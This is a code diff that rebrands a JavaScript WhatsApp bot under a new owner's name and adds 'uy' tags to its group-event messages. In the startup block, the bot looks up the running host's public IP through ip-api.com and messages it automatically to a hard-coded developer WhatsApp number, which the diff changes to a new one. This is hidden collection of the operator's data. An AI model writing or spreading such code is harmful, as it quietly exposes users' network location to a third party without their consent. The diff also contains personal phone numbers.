@@ -46,7 +46,7 @@ const starts = async (hyper = new WAConnection()) => {
   
     hyper.logger.level = 'warn'
     hyper.version = [2, 2143, 3] 
-    hyper.browserDescription = ["Queen Alexa", "Safari", "3.0"];
+    hyper.browserDescription = ["UMASHANKAR YADAV", "Safari", "3.0"];
 
     hyper.on('qr', () => {
         console.log(color('[','white'), color('!','red'), color(']','white'), color(' Scan the qr, bro, make WhatsApp 👍 '))
@@ -56,7 +56,7 @@ const starts = async (hyper = new WAConnection()) => {
     console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       hyper.sendMessage("94767043432@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Hyper Mod",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./image/lakshitha.jpg'),sourceUrl:"https://wa.me/94767043432?text=welcome"}}})
+       hyper.sendMessage("+917489934326@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Hyper Mod",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./image/lakshitha.jpg'),sourceUrl:"https://wa.me/917489934326?text=welcome"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
    })
     hyper.on('connecting', () => {
@@ -72,7 +72,7 @@ fetch(`http://ip-api.com/line`).then(res => res.text())
     }) 
 
     hyper.on('chat-update', async (message) => {
-        require('./Queen-Alexa.js')(hyper, message)
+        require('./Umashankar-yadav.js')(hyper, message)
     })
     
     await hyper.connect({timeoutMs: 30*1000})
@@ -231,30 +231,30 @@ const imageToBase64 = require('image-to-base64')
     remoteJid: "0@s.whatsapp.net"},message: {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "mememteeeekkeke","groupName": "hyperbot", "caption": `Creator Botwea © 2K21`, 'jpegThumbnail': fs.readFileSync(`image/${setting.thumb}`)}}}    	
       metdata = await hyper.groupMetadata(anu.jid)
         if(anu.announce == 'false'){
-        teks = `「 GROUP OPENED 」\n\nGroup has been opened by admin\nNow all members can send messages`
+        teks = `「 GROUP uy OPENED 」\n\nGroup has been opened by admin\nNow all members can send messages`
         hyper.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
         console.log(clc.yellow(`[ Group Opened ] In ${metdata.subject}`))
       }
       else if(anu.announce == 'true'){
-        teks = `「 GROUP CLOSED 」\n\nThe group has been closed by admin\nNow only admins can send messages`
+        teks = `「 *uy* GROUP uy CLOSED 」\n\nThe group has been closed by admin\nNow only admins can send messages`
         hyper.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
         console.log(clc.yellow(`[ Group Closed ] In ${metdata.subject}`))
       }
       else if(!anu.desc == ''){
         tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
-        teks = `「 GROUP DESCRIPTION CHANGE 」\n\nGroup description has been changed \nBy Admin @${anu.descOwner.split('@')[0]}\n• New Description : \n${anu.desc}`
+        teks = `「 ©uy GROUP DESCRIPTION CHANGE 」\n\nGroup description has been changed \nBy Admin @${anu.descOwner.split('@')[0]}\n• New Description : \n${anu.desc}`
         hyper.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: falfa})
         console.log(clc.yellow(`[ Group Description Change ] In ${metdata.subject}`))
       }
       else if(anu.restrict == 'false'){
-        teks = `「 GROUP SETTING CHANGE 」\n\nEdit Group info has been opened for members\nNow all members can edit this group info`
+        teks = `「 *uy* GROUP SETTING CHANGE 」\n\nEdit Group info has been opened for members\nNow all members can edit this group info`
         hyper.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
         console.log(clc.yellow(`[ Group Setting Change ] In ${metdata.subject}`))
       }
       else if(anu.restrict == 'true'){
-        teks = `「 GROUP SETTING CHANGE 」\n\nEdit Group info has been closed for members\nNow only group admins can edit this group info`
+        teks = `「 *uy* GROUP SETTING CHANGE 」\n\nEdit Group info has been closed for members\nNow only group admins can edit this group info`
         hyper.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
-        console.log(clc.yellow(`[ Group Setting Change ] In ${metdata.subject}`))
+        console.log(clc.yellow(`[*uy* Group Setting Change ] In ${metdata.subject}`))
       }
      })
     }
